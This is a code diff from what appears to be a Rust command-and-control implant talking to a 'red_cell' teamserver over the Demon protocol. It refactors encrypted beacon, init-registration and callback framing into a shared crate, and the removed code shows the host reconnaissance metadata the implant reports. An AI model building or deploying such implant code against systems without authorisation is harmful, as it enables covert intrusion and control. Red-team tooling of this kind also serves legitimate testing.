@@ -2,76 +2,18 @@
 
 use std::path::Path;
 
+pub use red_cell_common::agent_protocol::{
+    AgentMetadata, build_callback_packet, build_init_packet, parse_init_ack,
+    serialize_init_metadata,
+};
 use red_cell_common::crypto::{
-    AGENT_IV_LENGTH, AGENT_KEY_LENGTH, AgentCryptoMaterial, ctr_blocks_for_len, decrypt_agent_data,
-    decrypt_agent_data_at_offset, encrypt_agent_data, encrypt_agent_data_at_offset,
+    AgentCryptoMaterial, ctr_blocks_for_len, decrypt_agent_data_at_offset,
 };
 use red_cell_common::demon::{
     DemonCallback, DemonCommand, DemonEnvelope, DemonMessage, DemonPackage,
 };
 
 use crate::error::PhantomError;
-
-/// Extension flag requesting monotonic CTR mode from the teamserver.
-///
-/// When set in the init metadata, the teamserver tracks per-agent CTR offsets
-/// instead of resetting to 0 on every message.  Must match the teamserver's
-/// `INIT_EXT_MONOTONIC_CTR` constant.
-const INIT_EXT_MONOTONIC_CTR: u32 = 1 << 0;
-
-/// Extension flag opting in to server-side sequence-number replay protection.
-///
-/// When set, the agent prefixes every callback payload (before encryption) with an
-/// 8-byte little-endian monotonic sequence number.  Must match the teamserver's
-/// `INIT_EXT_SEQ_PROTECTED` constant.
-const INIT_EXT_SEQ_PROTECTED: u32 = 1 << 1;
-
-/// Host metadata sent in the initial `DEMON_INIT` registration.
-#[derive(Debug, Clone)]
-pub struct AgentMetadata {
-    /// Machine hostname.
-    pub hostname: String,
-    /// Effective username.
-    pub username: String,
-    /// Domain or workgroup.
-    pub domain_name: String,
-    /// Best-effort internal IP address.
-    pub internal_ip: String,
-    /// Executable path.
-    pub process_path: String,
-    /// Current process identifier.
-    pub process_pid: u32,
-    /// Current thread identifier.
-    pub process_tid: u32,
-    /// Parent process identifier.
-    pub process_ppid: u32,
-    /// Process architecture.
-    pub process_arch: u32,
-    /// Elevated/admin flag.
-    pub elevated: bool,
-    /// Base address placeholder.
-    pub base_address: u64,
-    /// OS major version placeholder.
-    pub os_major: u32,
-    /// OS minor version placeholder.
-    pub os_minor: u32,
-    /// OS product type placeholder.
-    pub os_product_type: u32,
-    /// OS service pack placeholder.
-    pub os_service_pack: u32,
-    /// OS build placeholder.
-    pub os_build: u32,
-    /// OS architecture.
-    pub os_arch: u32,
-    /// Sleep delay in milliseconds.
-    pub sleep_delay: u32,
-    /// Sleep jitter percentage.
-    pub sleep_jitter: u32,
-    /// Kill date timestamp or zero.
-    pub kill_date: u64,
-    /// Working-hours bitmask or zero.
-    pub working_hours: i32,
-}
 
 /// Decrypted task stream plus the next shared CTR offset.
 #[derive(Debug, Clone)]
@@ -80,65 +22,6 @@ pub struct TaskingResponse {
     pub packages: Vec<DemonPackage>,
     /// Shared CTR offset after consuming the response body.
     pub next_ctr_offset: u64,
-}
-
-/// Build a `DEMON_INIT` packet matching the Demon transport framing.
-///
-/// When `init_secret_version` is [`Some`], a one-byte secret version is written
-/// after the cleartext AES key/IV and before the encrypted metadata.  This
-/// matches listeners configured with `InitSecrets = [...]` (versioned HKDF).
-/// When [`None`], the envelope matches the legacy single-`InitSecret` profile
-/// (no version byte).
-pub fn build_init_packet(
-    agent_id: u32,
-    crypto: &AgentCryptoMaterial,
-    metadata: &AgentMetadata,
-    init_secret_version: Option<u8>,
-) -> Result<Vec<u8>, PhantomError> {
-    let plaintext = serialize_init_metadata(agent_id, metadata)?;
-    let encrypted = encrypt_agent_data(&crypto.key, &crypto.iv, &plaintext)?;
-
-    let extra = usize::from(init_secret_version.is_some());
-    let payload_len = 4 + 4 + AGENT_KEY_LENGTH + AGENT_IV_LENGTH + extra + encrypted.len();
-    let mut payload = Vec::with_capacity(payload_len);
-    payload.extend_from_slice(&u32::from(DemonCommand::DemonInit).to_be_bytes());
-    payload.extend_from_slice(&0_u32.to_be_bytes());
-    payload.extend_from_slice(&crypto.key);
-    payload.extend_from_slice(&crypto.iv);
-    if let Some(version) = init_secret_version {
-        payload.push(version);
-    }
-    payload.extend_from_slice(&encrypted);
-
-    let envelope = DemonEnvelope::new(agent_id, payload)?;
-    Ok(envelope.to_bytes())
-}
-
-/// Parse the init acknowledgement and return the consumed receive CTR blocks.
-pub fn parse_init_ack(
-    response_body: &[u8],
-    agent_id: u32,
-    crypto: &AgentCryptoMaterial,
-) -> Result<u64, PhantomError> {
-    if response_body.is_empty() {
-        return Err(PhantomError::InvalidResponse("empty init acknowledgement"));
-    }
-
-    let decrypted = decrypt_agent_data(&crypto.key, &crypto.iv, response_body)?;
-    let acked_id = decrypted
-        .get(..4)
-        .ok_or(PhantomError::InvalidResponse("init acknowledgement too short"))?;
-    let acked_id = u32::from_le_bytes(
-        acked_id
-            .try_into()
-            .map_err(|_| PhantomError::InvalidResponse("invalid init acknowledgement body"))?,
-    );
-
-    if acked_id != agent_id {
-        return Err(PhantomError::InvalidResponse("init acknowledgement agent_id mismatch"));
-    }
-
-    Ok(ctr_blocks_for_len(response_body.len()))
 }
 
 /// Parse and decrypt a `CommandGetJob` response.
@@ -218,7 +101,7 @@ pub fn build_output_packet(
     text: &str,
 ) -> Result<Vec<u8>, PhantomError> {
     let payload = length_prefixed_bytes(text.as_bytes())?;
-    build_callback_packet(
+    Ok(build_callback_packet(
         agent_id,
         crypto,
         ctr_offset,
@@ -226,7 +109,7 @@ pub fn build_output_packet(
         u32::from(DemonCommand::CommandOutput),
         request_id,
         &payload,
-    )
+    )?)
 }
 
 /// Build a generic error callback packet.
@@ -242,7 +125,7 @@ pub fn build_error_packet(
     let mut payload = Vec::new();
     payload.extend_from_slice(&u32::from(DemonCallback::ErrorMessage).to_be_bytes());
     payload.extend_from_slice(&length_prefixed_bytes(text.as_bytes())?);
-    build_callback_packet(
+    Ok(build_callback_packet(
         agent_id,
         crypto,
         ctr_offset,
@@ -250,7 +133,7 @@ pub fn build_error_packet(
         u32::from(DemonCommand::CommandError),
         request_id,
         &payload,
-    )
+    )?)
 }
 
 /// Build an exit callback packet.
@@ -263,7 +146,7 @@ pub fn build_exit_packet(
     request_id: u32,
     exit_method: u32,
 ) -> Result<Vec<u8>, PhantomError> {
-    build_callback_packet(
+    Ok(build_callback_packet(
         agent_id,
         crypto,
         ctr_offset,
@@ -271,7 +154,7 @@ pub fn build_exit_packet(
         u32::from(DemonCommand::CommandExit),
         request_id,
         &exit_method.to_be_bytes(),
-    )
+    )?)
 }
 
 /// Return the number of CTR blocks consumed by a callback payload body.
@@ -283,93 +166,12 @@ pub fn callback_ctr_blocks(callback_payload_len: usize) -> u64 {
     ctr_blocks_for_len(8 + 4 + callback_payload_len)
 }
 
-pub(crate) fn build_callback_packet(
-    agent_id: u32,
-    crypto: &AgentCryptoMaterial,
-    ctr_offset: u64,
-    seq_num: u64,
-    command_id: u32,
-    request_id: u32,
-    callback_payload: &[u8],
-) -> Result<Vec<u8>, PhantomError> {
-    // Encrypted body: seq_num(8 LE) + payload_len(4) + payload.
-    // command_id and request_id remain in the clear so the teamserver can
-    // read them before decryption.
-    let mut plaintext = Vec::with_capacity(8 + 4 + callback_payload.len());
-    plaintext.extend_from_slice(&seq_num.to_le_bytes());
-    let payload_len = u32::try_from(callback_payload.len())
-        .map_err(|_| PhantomError::InvalidResponse("callback payload too large"))?;
-    plaintext.extend_from_slice(&payload_len.to_be_bytes());
-    plaintext.extend_from_slice(callback_payload);
-
-    let encrypted = encrypt_agent_data_at_offset(&crypto.key, &crypto.iv, ctr_offset, &plaintext)?;
-
-    let mut body = Vec::with_capacity(8 + encrypted.len());
-    body.extend_from_slice(&command_id.to_be_bytes());
-    body.extend_from_slice(&request_id.to_be_bytes());
-    body.extend_from_slice(&encrypted);
-
-    let envelope = DemonEnvelope::new(agent_id, body)?;
-    Ok(envelope.to_bytes())
-}
-
-fn serialize_init_metadata(
-    agent_id: u32,
-    metadata: &AgentMetadata,
-) -> Result<Vec<u8>, PhantomError> {
-    let mut buf = Vec::with_capacity(256);
-
-    buf.extend_from_slice(&agent_id.to_be_bytes());
-    buf.extend_from_slice(&length_prefixed_bytes(metadata.hostname.as_bytes())?);
-    buf.extend_from_slice(&length_prefixed_bytes(metadata.username.as_bytes())?);
-    buf.extend_from_slice(&length_prefixed_bytes(metadata.domain_name.as_bytes())?);
-    buf.extend_from_slice(&length_prefixed_bytes(metadata.internal_ip.as_bytes())?);
-    buf.extend_from_slice(&length_prefixed_utf16le(&metadata.process_path)?);
-    buf.extend_from_slice(&metadata.process_pid.to_be_bytes());
-    buf.extend_from_slice(&metadata.process_tid.to_be_bytes());
-    buf.extend_from_slice(&metadata.process_ppid.to_be_bytes());
-    buf.extend_from_slice(&metadata.process_arch.to_be_bytes());
-    buf.extend_from_slice(&u32::from(metadata.elevated).to_be_bytes());
-    buf.extend_from_slice(&metadata.base_address.to_be_bytes());
-    buf.extend_from_slice(&metadata.os_major.to_be_bytes());
-    buf.extend_from_slice(&metadata.os_minor.to_be_bytes());
-    buf.extend_from_slice(&metadata.os_product_type.to_be_bytes());
-    buf.extend_from_slice(&metadata.os_service_pack.to_be_bytes());
-    buf.extend_from_slice(&metadata.os_build.to_be_bytes());
-    buf.extend_from_slice(&metadata.os_arch.to_be_bytes());
-    buf.extend_from_slice(&metadata.sleep_delay.to_be_bytes());
-    buf.extend_from_slice(&metadata.sleep_jitter.to_be_bytes());
-    buf.extend_from_slice(&metadata.kill_date.to_be_bytes());
-    buf.extend_from_slice(&metadata.working_hours.to_be_bytes());
-
-    // Extensions: monotonic CTR mode + sequence-number replay protection.
-    buf.extend_from_slice(&(INIT_EXT_MONOTONIC_CTR | INIT_EXT_SEQ_PROTECTED).to_be_bytes());
-
-    Ok(buf)
-}
-
 fn length_prefixed_bytes(bytes: &[u8]) -> Result<Vec<u8>, PhantomError> {
     let len = u32::try_from(bytes.len())
         .map_err(|_| PhantomError::InvalidResponse("length-prefixed field too large"))?;
     let mut out = Vec::with_capacity(4 + bytes.len());
     out.extend_from_slice(&len.to_be_bytes());
     out.extend_from_slice(bytes);
-    Ok(out)
-}
-
-fn length_prefixed_utf16le(value: &str) -> Result<Vec<u8>, PhantomError> {
-    let utf16 = value.encode_utf16().collect::<Vec<_>>();
-    let byte_len = utf16
-        .len()
-        .checked_mul(2)
-        .ok_or(PhantomError::InvalidResponse("UTF-16LE field length overflow"))?;
-    let len = u32::try_from(byte_len)
-        .map_err(|_| PhantomError::InvalidResponse("UTF-16LE field too large"))?;
-    let mut out = Vec::with_capacity(4 + byte_len);
-    out.extend_from_slice(&len.to_be_bytes());
-    for unit in utf16 {
-        out.extend_from_slice(&unit.to_le_bytes());
-    }
     Ok(out)
 }
 
@@ -385,6 +187,8 @@ pub fn executable_name(path: &Path) -> String {
 mod tests {
     use std::path::Path;
 
+    use red_cell_common::agent_protocol::INIT_EXT_MONOTONIC_CTR;
+    use red_cell_common::agent_protocol::INIT_EXT_SEQ_PROTECTED;
     use red_cell_common::crypto::{
         ctr_blocks_for_len, decrypt_agent_data, decrypt_agent_data_at_offset, encrypt_agent_data,
         generate_agent_crypto_material,
@@ -446,12 +250,12 @@ mod tests {
         let tail = &plaintext[plaintext.len() - 4..];
         let ext_flags = u32::from_be_bytes(tail.try_into().expect("4 bytes"));
         assert_ne!(
-            ext_flags & super::INIT_EXT_MONOTONIC_CTR,
+            ext_flags & INIT_EXT_MONOTONIC_CTR,
             0,
             "init packet must include INIT_EXT_MONOTONIC_CTR extension flag"
         );
         assert_ne!(
-            ext_flags & super::INIT_EXT_SEQ_PROTECTED,
+            ext_flags & INIT_EXT_SEQ_PROTECTED,
             0,
             "init packet must include INIT_EXT_SEQ_PROTECTED extension flag"
         );
@@ -615,7 +419,9 @@ mod tests {
         let error = parse_init_ack(&ack, 0x4242_1337, &crypto).expect_err("mismatch");
         assert!(matches!(
             error,
-            crate::error::PhantomError::InvalidResponse("init acknowledgement agent_id mismatch")
+            red_cell_common::agent_protocol::AgentProtocolError::InvalidResponse(
+                "init acknowledgement agent_id mismatch"
+            )
         ));
     }
 
